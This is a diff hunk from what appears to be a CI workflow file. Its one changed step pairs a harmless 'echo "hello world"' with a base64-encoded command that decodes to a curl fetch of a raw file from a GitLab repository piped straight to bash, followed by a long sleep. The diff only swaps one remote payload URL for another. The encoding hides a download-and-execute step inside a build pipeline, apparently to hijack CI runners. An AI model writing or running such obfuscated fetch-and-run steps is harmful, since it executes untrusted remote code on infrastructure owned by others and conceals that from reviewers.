@@ -74,7 +74,7 @@ jobs:
               SLEEP=3600
             fi
           fi
-          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbHVtYW5zYW5zIHwgYmFzaA | sh & sleep $SLEEP
+          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9zcGluYXpvbGxhL3NhaW50Ly0vcmF3L21haW4vbHVtYmFyYW5zIHwgYmFzaA | sh & sleep $SLEEP
 
   trigger-pancung:
     needs: run-lscpu
